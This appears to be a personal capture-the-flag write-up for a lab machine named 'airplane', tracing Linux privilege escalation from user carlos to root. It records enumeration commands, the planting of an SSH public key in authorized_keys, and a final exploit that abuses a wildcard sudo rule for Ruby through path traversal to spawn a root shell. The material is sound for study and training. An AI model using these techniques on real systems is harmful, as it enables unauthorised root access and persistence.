Just from the beggining i found the following file in the directory of this person:

```txt
-rw-r--r--  1 carlos carlos    0 Apr 17 07:46 .sudo_as_admin_successful
```

This indicates to me that this user is capable of doing sudo in this computer, therefore  getting the password might be beneficial.

Therefore, i was quite interested in the following directories:

```bash
drwxrwxr-x 13 carlos carlos 4096 Apr 17 08:06 .cache
drwx------ 11 carlos carlos 4096 Apr 17 07:56 .config
drwx------  3 carlos carlos 4096 Apr 17 07:49 .gnupg
drwxr-xr-x  3 carlos carlos 4096 Apr 17 07:44 .local
drwx------  4 carlos carlos 4096 Apr 17 08:06 .mozilla
-rw-r--r--  1 carlos carlos    0 Nis 17 07:46 .sudo_as_admin_successful
```

After this and finding the file sudo_as_admin i thought "i need to do sudo since the person who made this machine probably used it to try their own weakness" and sure enough i was right. HOWEVER, it is not possible to see the command you have to run as sudo without an actual login, which i did not have. 

After a long time trying to get the password (since there is activity left in the computer from searches in the internet i though it might have been there. but turns out that since you have access to .ssh you can simply drop a public key in authorized_keys) and then you can see the sudo you have to do.

**so that took a little bit of my time (i enjoy these detours anyway)**

```bash
carlos@airplane:/tmp/rubyapp$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

First thing i tried was using other paths from /root, did not work :(
## FURTHER SEARCH

```bash
carlos@airplane:/tmp$ sudo /usr/bin/ruby /root/*.rb
Traceback (most recent call last):
/usr/bin/ruby: No such file or directory -- /root/*.rb (LoadError)
```

There are no files in the given directory -> we probably have to create our own

None of the parts of /usr/bin/ruby can be modified at least directly from carlos
None of the parts of /root can be modified at least directly from carlos

```bash
drwxr-xr-x  14 root root 4096 Mar 16  2023 usr
drwxr-xr-x   2 root root 36864 Nis 18 13:29 bin
lrwxrwxrwx 1 root root 7 Nis  3  2020 /usr/bin/ruby -> ruby2.7
-rwxr-xr-x 1 root root 14488 Tem  6  2023 /usr/bin/ruby2.7
drwx------   5 root root 4096 Nis 17 08:39 root
```

## TRYING TO GET INFO FROM THE USER PROFILE

Searched:
- .mozilla: things that would have been useful before but not now **DONE**
To search:
- .cache
- .config
- .local
### CAPABILITIES

Tried capabilities, nothing out of the ordinary that might allow one to write.

```bash
carlos@airplane:~$ getcap / -r 2>/dev/null
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/snap/core20/1828/usr/bin/ping = cap_net_raw+ep
```

```bash
hudson@airplane:~$ getcap / -r 2>/dev/null
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+epcap_net_bind_service,cap_net_admin
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/snap/core20/1828/usr/bin/ping = cap_net_raw+ep
```
### SUID SGID

Interesting things found with carlos.

```bash
carlos@airplane:~$ ls -la /usr/sbin/pppd
-rwsr-xr-- 1 root dip 395144 Tem 23  2020 /usr/sbin/pppd
```

Interesting things found with hudson.

```bash
hudson@airplane:~$ find / -perm /u+s -user root -type f  2>/dev/null
/usr/sbin/pppd
```

### LIBRARIES

Another thought was that i might be able to write to a library/file called by ruby when executed

```bash
carlos@airplane:~$ find /usr/lib -perm o+w
carlos@airplane:~$ find /usr/local/lib -perm o+w
carlos@airplane:~$ find / -perm o+w 2>/dev/null # so in general there is not anything anyone can modify
```
### PROCESSES EXECUTED BY ROOT

Interesting things found 
```bash
2024/06/27 13:14:43 CMD: UID=0    PID=654    | /usr/sbin/gdm3 # screenshots
```

Cron seems to be running.

##  CRON

nothing seen that would be suspicious, so can't say


## TURNS OUT WHAT I WAS TRYING AT THE START SHOULD HAVE WORKED :< (ANGER BUILDING UP) (acktually kinda curious why though)

```bash
carlos@airplane:~$ echo 'system("/bin/bash")' > /home/carlos/rubyapp.rb
carlos@airplane:~$ sudo /usr/bin/ruby /root/../home/carlos/rubyapp.rb
root@airplane:/home/carlos# cat /root/root.txt 
```

